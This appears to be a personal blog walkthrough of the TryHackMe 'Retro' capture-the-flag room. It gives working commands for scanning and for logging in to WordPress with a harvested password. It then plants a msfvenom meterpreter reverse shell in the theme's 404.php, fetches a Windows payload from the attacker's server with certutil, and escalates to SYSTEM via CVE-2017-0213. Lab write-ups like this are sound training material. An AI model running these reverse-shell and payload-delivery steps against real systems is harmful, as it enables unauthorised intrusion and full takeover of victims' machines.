---
title: "Retro CTF"
datePublished: Mon Aug 07 2023 09:07:23 GMT+0000 (Coordinated Universal Time)
cuid: cll0nft0w000g09miedbsablx
slug: retro-ctf
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1691398073255/32544658-38cb-46d5-855b-da5355a74db6.png
tags: ctf, penetration-testing, 2articles1week, tryhackme, ctf-writeup

---

This walkthrough will go over the [**Retro**](https://tryhackme.com/room/retro) room found on [**TryHackMe**](https://tryhackme.com/). The objective behind this room is to use a bit of passive recon to find a set of credentials in order to RDP into the box, identify a vulnerability in the `Windows COM` `(CVE-2017-0213)`, and privesc to `NT AUTHORITY\SYSTEM`.

### Step 1: What's Out There?

```bash
nmap -sC -sV -p- -Pn retro.thm --min-rate=1000
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691398315139/3276f81f-931e-46fc-a431-507ba270bf34.png align="center")

Looks like we have a webserver and an RDP session open. Let's check out what the web server can offer us.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691398334110/a54a66b3-878f-4450-be00-382875ec42e0.png align="center")

A default `Microsoft IIS` page. We'll use `ffuf` to enumerate for directories.

### Step 2: FFUF

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://retro.thm/FUZZ -fs 703
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691398377905/5a5ad8d7-dd64-4f55-b315-8a631ebb9c81.png align="center")

Nice, we discovered a directory called `/retro`. Let's go to it.

### Step 3: Finding Credentials

We discovered a blog that seems to be run by a username `Wade`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691398407110/e8fa1ff2-f791-4a96-a2d9-c9f1ba46c782.png align="center")

After downloading and viewing the `Comments RSS` data, we discovered text that might be a potential password.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691399159508/449ee0ca-cad1-4dcb-a2a0-b59ba4aa2af5.png align="center")

Taking this information and plugging it into the `Site Admin` link allows us to log in to the WordPress admin panel.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691398430562/494d3ee4-899a-4795-adf3-b97906094b02.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691398433597/744cfd33-ecb7-423b-b836-30bed77627d1.png align="center")

### Step 4: Initial Foothold

Based on my experience with getting a reverse shell with WordPress, we would need to modify the `404.php` file and inject our generated shell code. We can do this with `msfvenom`.

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.13.28.215 LPORT=1337 -f raw -o retro_shell.php
```

Now let's start initializing our handler so we can catch the shell once it executes.

1. `msfconsole`
    
2. `use exploit/multi/handler`
    
3. `set payload php/meterpreter/reverse_tcp`
    
4. `set LHOST <ATTACKER_IP>`
    
5. `set LHOST 1337`
    
6. `exploit`
    

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691398464051/5c95ac08-7e7c-49a3-9514-c4a3d63bc638.png align="center")

From here we want to copy our retro\_shell.php code and paste it into `404.php`.We can do this by navigating to Appearance &gt; Theme Editor &gt; 404 Template. Delete the content of the `404.php` file and paste it into your shell. Should look like this.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691398480745/2db8d5ef-e503-4dc9-9f49-8772d9867edc.png align="center")

Now navigate to the file in your browser ([http://retro.thm/retro/wp-content/themes/90s-retro/404.php](http://retro.thm/retro/wp-content/themes/90s-retro/404.php)) and it will drop you into a meterpreter session.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691398490021/d1f3fe9d-5e5e-439d-9033-b0611dee0c68.png align="center")

### Step 5: Detour

Okay, so for some reason I could not get the meterpreter shell to stabilize with the 404.php route. But, that's alright. Sometimes we have to get creative and approach a problem from a different angle... in the end, we still get the same outcome. Root.

So what I decided to do is RDP into the box with our same credentials and upload a payload, set my handler, and catch it with a stable meterpreter session.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691398523489/9c78942b-a252-4569-8b2b-238ee9494308.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691398526561/f18a5b32-ae22-4469-b5c9-49e5096bf9e5.png align="center")

Generate a payload using `msfvenom`.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.13.28.215 LPORT=1337 -f exe -o payload.exe
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691398540276/0f5e97a2-b254-4ccd-b7cb-d58b87a1bd9b.png align="center")

Start an HTTP Server and transfer it over using `certutil`.

```bash
certutil -urlcache -f http://10.13.28.215:8000/payload.exe payload.exe
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691398553018/d660007e-e76a-4ec6-ac77-c2bc1f327f0d.png align="center")

Now we want to set up our listener and catch the shell. Same as before with a slight modification.

1. `msfconsole`
    
2. `use exploit/multi/handler`
    
3. `set payload windows/x64/meterpreter/reverse_tcp`
    
4. `set LHOST <ATTACKER_IP>`
    
5. `set LPORT 1337`
    
6. `exploit`
    

Run the payload from the victim box and drop it into a meterpreter session.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691398569944/b784bfca-e595-4ef2-83ed-4120ec8541dc.png align="center")

### Step 6: Privesc

We're going to use the `Windows Exploit Suggester (WES)` to find a way to elevate our privileges. First, we need to pull the system's information in order to pull this off.

> `systeminfo > sysinfo.txt`

Now we can pull it down to our attack box.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691398607012/92071128-8d78-40c2-9043-f7c95ff08f5e.png align="center")

From here we can use `WES` to find a privesc vector (update database before running:

```bash
./windows-exploit-suggester.py --update
```

```bash
./windows-exploit-suggester.py --database 2023-08-07-mssb.xls --sysinfo ~/sysinfo.txt --ostext 'windows 10 64-bit' -l
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691398680395/042c573a-f970-4fba-b5e9-26512fb32738.png align="center")

This build of Windows 10 is vulnerable to a `Windows COM` privesc, `CVE-2017-0213`. There's a binary that we can use to automate this exploit for us. Let's download it to our attack box and upload it to our victim. Link to binary here: [https://github.com/WindowsExploits/Exploits/tree/master/CVE-2017-0213](https://github.com/WindowsExploits/Exploits/tree/master/CVE-2017-0213)

Once we get it on our victim box we can run it and then move over to our RDP session and find a new CMD shell spawned with `NT AUTHORITY\SYSTEM` rights.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691399172768/3d8491c3-f96f-4d6b-912d-db3096f8356b.png align="center")

Finally...this one was very difficult and time-consuming. I ended up going down multiple rabbit holes and failing at stabilizing shells more times than I'd like to admit. But all-in-all, I can say this box was rewarding and has taught me a lot about Windows privesc. I hope you enjoyed this walkthrough, and as always, Happy Hacking.